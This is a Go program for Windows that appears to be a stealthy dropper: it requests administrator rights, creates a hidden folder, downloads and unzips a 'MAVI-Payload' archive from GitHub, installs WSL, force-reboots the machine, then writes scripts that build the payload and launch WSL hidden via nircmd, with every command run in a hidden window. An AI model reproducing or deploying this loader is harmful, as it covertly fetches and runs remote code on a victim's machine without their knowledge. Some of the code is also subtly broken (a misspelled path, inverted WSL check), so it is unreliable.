package main

import (
	"archive/zip"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
)

const MAVIP_URL = "https://github.com/dev-kas/MAVI-Payload/archive/refs/heads/master.zip"

// Helper Functions
func getPdcPath() string {
	// get os variable "PDC"
	pdcPath, exists := os.LookupEnv("PDC")
	if !exists || !pathExists(pdcPath) {
		// if not exist, create it
		username := os.Getenv("USERNAME")
		pdcPath = filepath.Join("C:\\Users", username, "Documents", "PDC_2094")
		os.Setenv("PDC", pdcPath)
		// Set the environment variable as a system variable
		cmd := exec.Command("setx", "PDC", pdcPath, "/M")
		cmd.SysProcAttr = &syscall.SysProcAttr{ HideWindow: true }
		cmd.Run()
		// Create the directory and set it as hidden
		os.MkdirAll(pdcPath, os.ModePerm)
		cmd = exec.Command("attrib", "+h", /* "+s", */ pdcPath)
		cmd.SysProcAttr = &syscall.SysProcAttr{ HideWindow: true }
		cmd.Run()
	}
	return pdcPath
}

func isAdmin() bool {
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	return err == nil
}

func runAsAdmin(prog string, logger *log.Logger) {
	// Restart the program as administrator
	absPath, err := filepath.Abs(prog)
	if err != nil {
		logger.Println("Failed to get absolute path:", err)
		os.Exit(1)
	}

	logger.Println("Requesting to run as Administrator:", absPath)

	cmd := exec.Command("powershell", "-Command", "Start-Process", fmt.Sprintf("\"%s\"", absPath), "-Verb", "runas")
	cmd.SysProcAttr = &syscall.SysProcAttr{ HideWindow: true }
	err = cmd.Run()
	if err != nil {
		logger.Println("Failed to run as administrator:", err)
		os.Exit(1)
	}
}

func pathExists(path string) bool {
	_, err := os.Stat(path)
	return !os.IsNotExist(err)
}

func downloadFile(url, filepath string) error {
	// Send a GET request to the URL
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// Create the file where the content will be saved
	outFile, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer outFile.Close()

	// Copy the content from the response body to the file
	_, err = io.Copy(outFile, resp.Body)
	if err != nil {
		return err
	}

	return nil
}

func unzip(src, dst string, logger *log.Logger) error {
    archive, err := zip.OpenReader(src)
    if err != nil {
        panic(err)
    }
    defer archive.Close()

    for _, f := range archive.File {
        filePath := filepath.Join(dst, f.Name)
        logger.Println("unzipping file ", filePath)

        if !strings.HasPrefix(filePath, filepath.Clean(dst)+string(os.PathSeparator)) {
            logger.Println("invalid file path")
            return fmt.Errorf("invalid file path")
        }
        if f.FileInfo().IsDir() {
            logger.Println("creating directory...")
            os.MkdirAll(filePath, os.ModePerm)
            continue
        }

        if err := os.MkdirAll(filepath.Dir(filePath), os.ModePerm); err != nil {
            return err
        }

        dstFile, err := os.OpenFile(filePath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())
        if err != nil {
            return err
        }

        fileInArchive, err := f.Open()
        if err != nil {
            return err
        }

        if _, err := io.Copy(dstFile, fileInArchive); err != nil {
            return err
        }

        dstFile.Close()
        fileInArchive.Close()
    }

	return nil
}

func isWSLInstalled() bool {
	cmd := exec.Command("wsl", "--status")
	cmd.SysProcAttr = &syscall.SysProcAttr{ HideWindow: true }
	err := cmd.Run()
	if err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			return exitErr.ExitCode() == 0
		}
	}
	return false
}

func makeLogger(outputpath string) *log.Logger {
	file, err := os.OpenFile(outputpath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0666)
	if err != nil {
		log.Fatal(err)
	}

	logger := log.New(file, "", log.LstdFlags)
	return logger
}

func main() {
	logger := makeLogger(filepath.Join(filepath.Dir(os.Args[0]), "log.txt"))

	// Request to run as administrator
	if !isAdmin() {
		runAsAdmin(os.Args[0], logger)
		return
	}

	// Check for checkpoint file
	checkpointFile := filepath.Join(getPdcPath(), "PENDING_INSTALLATION_CHECKPOINT")
	if pathExists(checkpointFile) {
		logger.Println("Checkpoint file detected, skipping skipping to checkpoint.")
		conFromWslInsCheckpoint(logger)
		return
	}

	// Now running as administrator
	logger.Println("Program started!")
	logger.Println("The current registered PDC path is:", getPdcPath())

	// Download MAVI-Payload Code
	logger.Println("Downloading MAVI-Payload Code...")
	zipFilePath := filepath.Join(getPdcPath(), "MAVIP.zip")
	err := downloadFile(MAVIP_URL, zipFilePath)
	if err != nil {
		logger.Println("Failed to download MAVI-Payload Code:", err)
		os.Exit(1)
	}
	logger.Println("Downloaded MAVI-Payload Code to", zipFilePath)

	// Unzipping MAVI-Payload Code
	logger.Println("Unzipping MAVI-Payload Code...")
	err = unzip(zipFilePath, getPdcPath(), logger)
	if err != nil {
		fmt.Println("Failed to unzip MAVI-Payload Code:", err)
		os.Exit(1)
	}
	logger.Println("Unzipped MAVI-Payload Code to", getPdcPath())

	// WSL
	logger.Print("Checking if WSL is installed... ")
	wslInstalled := isWSLInstalled()
	logger.Println(wslInstalled)
	if !wslInstalled {
		logger.Println("Installing WSL...")
		cmd := exec.Command("wsl", "--install", "-d", "Ubuntu")
		cmd.SysProcAttr = &syscall.SysProcAttr{ HideWindow: true }
		output, err := cmd.Output()
		if err != nil {
			logger.Println("Failed to install WSL:", err)
			os.Exit(1)
		}
		logger.Println("Installed WSL - Reboot required.", string(output))
		fmt.Println("Rebooting in 5 seconds...")

		// clean up
		checkpointFile := filepath.Join(getPdcPath(), "PENDING_INSTALLATION_CHECKPOINT")
		err = os.WriteFile(checkpointFile, []byte("PAUSED-AT-WSL-INSTALLATION-REBOOT"), 0666)
		if err != nil {
			logger.Println("Failed to create checkpoint file:", err)
			os.Exit(1)
		}

		time.Sleep(5 * time.Second)
		logger.Println("Rebooting...")
		cmd = exec.Command("shutdown", "/r", "/t", "0")
		cmd.SysProcAttr = &syscall.SysProcAttr{ HideWindow: true }
		cmd.Run()
		return
	}
}

func conFromWslInsCheckpoint(logger *log.Logger) {
	logger.Println("Continuing from checkpoint...")

	setupScript := filepath.Join(getPdcPath(), "setup.sh")
	f, err := os.Create(setupScript)
	if err != nil {
		logger.Println("Failed to create setup script:", err)
		os.Exit(1)
	}
	defer f.Close()

	setupScriptContents := fmt.Sprintf(`#!/bin/bash
	cd ./MAVI-Payload-master
	apt update && apt-get upgrade -y
	apt install -y python3.12-venv
	python3 -m venv .venv
	source .venv/bin/activate
	./util.sh install
	./util.sh build
	echo "%s/MAVI-Payload-naster/dist/main" >> ~/.bashrc
	source ~/.bashrc
	`, "/mnt/" + strings.Replace(strings.Replace(getPdcPath(), "\\", "/", -1), "C:", "c", 1))

	err = os.WriteFile(setupScript, []byte(setupScriptContents), 0755)
	if err != nil {
		logger.Println("Failed to write setup script:", err)
		os.Exit(1)
	}

	startScript := filepath.Join(getPdcPath(), "start.bat")
	f, err = os.Create(startScript)
	if err != nil {
		logger.Println("Failed to create setup script:", err)
		os.Exit(1)
	}
	defer f.Close()

	startScriptContents := fmt.Sprintf(`@echo off
	cd %s
	.\nircmd.exe exec hide wsl
	`, getPdcPath())

	err = os.WriteFile(startScript, []byte(startScriptContents), 0755)
	if err != nil {
		logger.Println("Failed to write setup script:", err)
		os.Exit(1)
	}

	// cmd := exec.Command("ubuntu", "run", "./setup.sh")
	// cmd.SysProcAttr = &syscall.SysProcAttr{ HideWindow: true }
	// cmd.Dir = getPdcPath()
	// output, err := cmd.Output()
	// if err != nil {
	// 	logger.Println("Failed to run setup.sh:", err)
	// 	os.Exit(1)
	// }
	// logger.Println("Ran setup.sh", string(output))

	logger.Println("Downloading nircmd...")
	err = downloadFile("https://www.nirsoft.net/utils/nircmd-x64.zip", filepath.Join(getPdcPath(), "nircmd.zip"))
	if err != nil {
		logger.Println("Failed to download nircmd:", err)
		os.Exit(1)
	}

	logger.Println("Unzipping nircmd...")
	err = unzip(filepath.Join(getPdcPath(), "nircmd.zip"), getPdcPath(), logger)
	if err != nil {
		logger.Println("Failed to unzip nircmd:", err)
		os.Exit(1)
	}

	logger.Println("Starting explorer at", getPdcPath())
	cmd := exec.Command("explorer.exe", getPdcPath())
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err = cmd.Run()
	if err != nil {
		logger.Println("Failed to run explorer:", err)
		os.Exit(1)
	}

	logger.Println("Running start.bat...")
	cmd = exec.Command("cmd", "/C", filepath.Join(getPdcPath(), "start.bat"))
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err = cmd.Run()
	if err != nil {
		logger.Println("Failed to run start.bat:", err)
		os.Exit(1)
	}
	logger.Println("Successfully ran start.bat")

	// checkpointFile := filepath.Join(getPdcPath(), "PENDING_INSTALLATION_CHECKPOINT")
	// err = os.Remove(checkpointFile)
	// if err != nil {
	// 	logger.Println("Failed to remove checkpoint file:", err)
	// 	os.Exit(1)
	// }
}

